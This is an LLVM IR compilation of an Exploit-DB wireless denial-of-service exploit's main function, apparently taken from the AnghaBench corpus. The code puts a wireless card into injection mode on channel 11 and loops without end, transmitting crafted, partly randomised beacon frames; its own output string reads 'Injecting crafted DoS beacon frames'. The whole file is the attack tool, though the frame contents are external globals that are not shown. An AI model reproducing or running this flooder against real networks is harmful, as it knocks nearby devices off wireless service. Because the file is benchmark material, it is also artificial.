; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_9442.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_9442.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.tx80211 = type { i8* }
%struct.tx80211_packet = type { i8*, i32 }

@BEACON_NOSSID_LEN = common dso_local global i32 0, align 4
@BEACON_SSID_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"[+] Initializing interface %s...\0A\00", align 1
@INJ_NODRIVER = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"[-] Driver name not recognized.\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"[-] Error initializing %s/%s\00", align 1
@TX80211_FUNCMODE_INJMON = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [33 x i8] c"[-] Error setting monitor mode.\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"[-] %s.\0A\00", align 1
@.str.5 = private unnamed_addr constant [28 x i8] c"[-] Error setting channel.\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"[-] Unable to open interface %s\0A\00", align 1
@BEACON_NOSSID = common dso_local global i32 0, align 4
@BEACON_SSID = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [44 x i8] c"[+] Injecting crafted DoS beacon frames...\0A\00", align 1
@.str.8 = private unnamed_addr constant [32 x i8] c"[-] Unable to transmit packet.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.tx80211, align 8
  %7 = alloca %struct.tx80211_packet, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @BEACON_NOSSID_LEN, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %8, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %9, align 8
  %18 = load i32, i32* @BEACON_SSID_LEN, align 4
  %19 = zext i32 %18 to i64
  %20 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %10, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 3
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = call i32 @usage(i8** %24)
  store i32 0, i32* %3, align 4
  %26 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %26)
  %27 = load i32, i32* %3, align 4
  ret i32 %27

28:                                               ; preds = %2
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i8* %31)
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @tx80211_resolvecard(i8* %35)
  store i32 %36, i32* %12, align 4
  %37 = load i32, i32* %12, align 4
  %38 = load i32, i32* @INJ_NODRIVER, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

40:                                               ; preds = %28
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %42 = call i32 @exit(i32 1) #4
  unreachable

43:                                               ; preds = %28
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = load i32, i32* %12, align 4
  %48 = call i32 @tx80211_init(%struct.tx80211* %6, i8* %46, i32 %47)
  store i32 %48, i32* %11, align 4
  %49 = load i32, i32* %11, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %60

51:                                               ; preds = %43
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %54, i8* %57)
  %59 = call i32 @exit(i32 1) #4
  unreachable

60:                                               ; preds = %43
  %61 = load i32, i32* @TX80211_FUNCMODE_INJMON, align 4
  %62 = call i32 @tx80211_setfunctionalmode(%struct.tx80211* %6, i32 %61)
  store i32 %62, i32* %11, align 4
  %63 = load i32, i32* %11, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %70

65:                                               ; preds = %60
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %67 = call i8* @tx80211_geterrstr(%struct.tx80211* %6)
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %67)
  %69 = call i32 @exit(i32 1) #4
  unreachable

70:                                               ; preds = %60
  %71 = call i32 @tx80211_setchannel(%struct.tx80211* %6, i32 11)
  store i32 %71, i32* %11, align 4
  %72 = load i32, i32* %11, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %79

74:                                               ; preds = %70
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  %76 = call i8* @tx80211_geterrstr(%struct.tx80211* %6)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %76)
  %78 = call i32 @exit(i32 1) #4
  unreachable

79:                                               ; preds = %70
  %80 = call i32 @tx80211_open(%struct.tx80211* %6)
  store i32 %80, i32* %11, align 4
  %81 = load i32, i32* %11, align 4
  %82 = icmp slt i32 %81, 0
  br i1 %82, label %83, label %90

83:                                               ; preds = %79
  %84 = getelementptr inbounds %struct.tx80211, %struct.tx80211* %6, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i8* %85)
  %87 = call i8* @tx80211_geterrstr(%struct.tx80211* %6)
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %87)
  %89 = call i32 @exit(i32 1) #4
  unreachable

90:                                               ; preds = %79
  %91 = call i32 @time(i32* null)
  %92 = call i32 @srand(i32 %91)
  %93 = load i32, i32* @BEACON_NOSSID, align 4
  %94 = load i32, i32* @BEACON_NOSSID_LEN, align 4
  %95 = call i32 @memcpy(i8* %17, i32 %93, i32 %94)
  %96 = load i32, i32* @BEACON_SSID, align 4
  %97 = load i32, i32* @BEACON_SSID_LEN, align 4
  %98 = call i32 @memcpy(i8* %20, i32 %96, i32 %97)
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.7, i64 0, i64 0))
  br label %100

100:                                              ; preds = %134, %90
  br label %101

101:                                              ; preds = %100
  %102 = call i32 (...) @rand()
  %103 = and i32 %102, 255
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %13, align 1
  %105 = load i8, i8* %13, align 1
  %106 = getelementptr inbounds i8, i8* %17, i64 15
  store i8 %105, i8* %106, align 1
  %107 = load i8, i8* %13, align 1
  %108 = getelementptr inbounds i8, i8* %17, i64 21
  store i8 %107, i8* %108, align 1
  %109 = load i8, i8* %13, align 1
  %110 = getelementptr inbounds i8, i8* %20, i64 15
  store i8 %109, i8* %110, align 1
  %111 = load i8, i8* %13, align 1
  %112 = getelementptr inbounds i8, i8* %20, i64 21
  store i8 %111, i8* %112, align 1
  %113 = getelementptr inbounds %struct.tx80211_packet, %struct.tx80211_packet* %7, i32 0, i32 0
  store i8* %17, i8** %113, align 8
  %114 = load i32, i32* @BEACON_NOSSID_LEN, align 4
  %115 = getelementptr inbounds %struct.tx80211_packet, %struct.tx80211_packet* %7, i32 0, i32 1
  store i32 %114, i32* %115, align 8
  %116 = call i64 @tx80211_txpacket(%struct.tx80211* %6, %struct.tx80211_packet* %7)
  %117 = icmp slt i64 %116, 0
  br i1 %117, label %118, label %123

118:                                              ; preds = %101
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0))
  %120 = call i8* @tx80211_geterrstr(%struct.tx80211* %6)
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %120)
  %122 = call i32 @exit(i32 1) #4
  unreachable

123:                                              ; preds = %101
  %124 = getelementptr inbounds %struct.tx80211_packet, %struct.tx80211_packet* %7, i32 0, i32 0
  store i8* %20, i8** %124, align 8
  %125 = load i32, i32* @BEACON_SSID_LEN, align 4
  %126 = getelementptr inbounds %struct.tx80211_packet, %struct.tx80211_packet* %7, i32 0, i32 1
  store i32 %125, i32* %126, align 8
  %127 = call i64 @tx80211_txpacket(%struct.tx80211* %6, %struct.tx80211_packet* %7)
  %128 = icmp slt i64 %127, 0
  br i1 %128, label %129, label %134

129:                                              ; preds = %123
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0))
  %131 = call i8* @tx80211_geterrstr(%struct.tx80211* %6)
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %131)
  %133 = call i32 @exit(i32 1) #4
  unreachable

134:                                              ; preds = %123
  br label %100
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8**) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @tx80211_resolvecard(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @tx80211_init(%struct.tx80211*, i8*, i32) #2

declare dso_local i32 @tx80211_setfunctionalmode(%struct.tx80211*, i32) #2

declare dso_local i8* @tx80211_geterrstr(%struct.tx80211*) #2

declare dso_local i32 @tx80211_setchannel(%struct.tx80211*, i32) #2

declare dso_local i32 @tx80211_open(%struct.tx80211*) #2

declare dso_local i32 @srand(i32) #2

declare dso_local i32 @time(i32*) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i64 @tx80211_txpacket(%struct.tx80211*, %struct.tx80211_packet*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
